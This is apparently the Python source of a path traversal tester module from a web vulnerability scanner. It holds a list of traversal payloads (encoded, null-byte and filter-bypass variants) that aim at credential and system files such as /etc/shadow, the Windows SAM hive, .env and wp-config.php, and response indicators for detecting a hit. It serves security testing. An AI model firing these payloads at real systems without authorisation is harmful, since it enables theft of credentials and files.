"""
Path Traversal Vulnerability Tester
"""

import asyncio
import json
from typing import List, Dict
from pathlib import Path
from .base_tester import BaseVulnerabilityTester


class PathTraversalTester(BaseVulnerabilityTester):
    """Tests for path traversal vulnerabilities"""
    
    def __init__(self, scanner_core, config, logger):
        super().__init__(scanner_core, config, logger)
        self._load_payloads()
    
    def _load_payloads(self):
        """Load Path Traversal payloads from payloads_master.json"""
        try:
            # Intentar cargar de payloads_master.json primero
            master_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloads_master.json'
            if master_file.exists():
                with open(master_file, 'r', encoding='utf-8') as f:
                    master_data = json.load(f)
                    lfi_data = master_data.get('LFI', {})
                    # Extraer payloads del formato estructurado
                    self.payloads_list = []
                    for payload_obj in lfi_data.get('payloads', []):
                        content = payload_obj.get('content', {})
                        if 'raw' in content:
                            self.payloads_list.append(content['raw'])
                        if 'urlencoded' in content and content['urlencoded'] != content.get('raw'):
                            self.payloads_list.append(content['urlencoded'])
                    
                    if self.payloads_list:
                        self.logger.info(f"Loaded {len(self.payloads_list)} Path Traversal payloads from payloads_master.json")
                        # Agregar también los payloads clásicos
                        self.payloads_list.extend(self._get_default_payloads())
                        return
            
            # Fallback a payloadsPathTraversal.json
            payload_file = Path(__file__).parent.parent.parent / 'PAYLOAD' / 'payloadsPathTraversal.json'
            with open(payload_file, 'r', encoding='utf-8') as f:
                self.payloads_list = json.load(f)
        except Exception as e:
            self.logger.warning(f"Could not load Path Traversal payloads: {e}")
            self.payloads_list = self._get_default_payloads()
    
    def get_payloads(self) -> List[str]:
        """Get path traversal payloads"""
        return self.payloads_list
    
    def _get_default_payloads(self) -> List[str]:
        """Default path traversal payloads"""
        return [
            # Basic traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            
            # Absolute paths
            '/etc/passwd',
            'C:\\Windows\\win.ini',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            
            # URL encoded
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
            
            # Double URL encoded
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # Unicode encoding
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini',
            
            # 16-bit Unicode
            '%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd',
            
            # Overlong UTF-8
            '..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '..\\..\\..\\windows\\win.ini%00',
            
            # Mixed slashes
            '../../../etc/passwd',
            '..\\../\\..\\etc/passwd',
            '..\\..\\../windows\\win.ini',
            
            # With file extension bypass
            '../../../etc/passwd.txt',
            '../../../etc/passwd.png',
            
            # Absolute path with traversal
            '/var/www/../../etc/passwd',
            'C:\\inetpub\\..\\..\\..\\Windows\\win.ini',
            
            # With current directory
            './../../etc/passwd',
            '.\\..\\..\\windows\\win.ini',
            
            # With redundant separators
            '..//..//..//etc//passwd',
            '..\\\\..\\\\..\\\\windows\\\\win.ini',
            
            # Filter bypass attempts
            '....//....//....//etc//passwd',
            '....\\\\....\\\\....\\\\windows\\\\win.ini',
            '..;/..;/..;/etc/passwd',
            
            # Common sensitive files (Unix/Linux)
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
            
            # Common sensitive files (Windows)
            'C:\\Windows\\win.ini',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\boot.ini',
            
            # Application files
            '../../../config/database.yml',
            '../../../.env',
            '../../../wp-config.php',
            '../../../config.php',
            '../../../configuration.php',
            
            # Web root escape
            '../../../../../var/www/html/index.php',
            '../../../../../inetpub/wwwroot/web.config',
        ]
    
    def check_vulnerability(self, response, baseline, payload) -> bool:
        """Check if response indicates path traversal"""
        if not response or not baseline:
            return False
        
        response_text = response.text.lower()
        
        # File content indicators
        sensitive_indicators = [
            # Unix/Linux /etc/passwd
            'root:x:0:0',
            'root:!:0:0',
            '/bin/bash',
            '/bin/sh',
            '/usr/sbin/nologin',
            '/home/',
            
            # Windows win.ini
            '[extensions]',
            '[fonts]',
            '[mci extensions]',
            'for 16-bit app support',
            
            # Config files
            'db_password',
            'database_password',
            'api_key',
            'secret_key',
            'private_key',
            
            # PHP config
            'db_host',
            'db_name',
            'define(',
            
            # Environment variables
            'path=',
            'home=',
            'user=',
            
            # Windows hosts file
            '127.0.0.1       localhost',
            '::1             localhost',
            
            # /proc files
            'linux version',
            'gcc version',
            'command line',
            
            # Error messages
            'permission denied',
            'no such file',
            'failed to open',
            'file not found',
            'cannot access'
        ]
        
        for indicator in sensitive_indicators:
            if indicator in response_text:
                return True
        
        # Check for significant response differences
        if self._response_differs_significantly(response, baseline):
            # Additional validation - look for file-like content
            if any(marker in response_text for marker in ['[', ']', ':', '/', '\\']):
                return True
        
        # Check status code changes
        if response.status_code != baseline.get('status_code'):
            if response.status_code in [200, 403, 404]:
                # These status codes with specific payloads might indicate successful traversal
                if any(keyword in payload.lower() for keyword in ['etc', 'passwd', 'windows', 'win.ini']):
                    return True
        
        return False
    
    def get_vulnerability_info(self) -> Dict[str, str]:
        """Return path traversal vulnerability information"""
        return {
            'name': 'Path Traversal',
            'severity': 'high',
            'description': 'The application is vulnerable to path traversal attacks, allowing access to files outside the intended directory.',
            'cwe': 'CWE-22',
            'owasp': 'A01:2021 - Broken Access Control',
            'impact': 'Unauthorized access to sensitive files, configuration files, source code, and credentials.',
            'remediation': 'Implement strict input validation, use allowlists for file paths, avoid user input in file operations, and use secure file APIs.'
        }
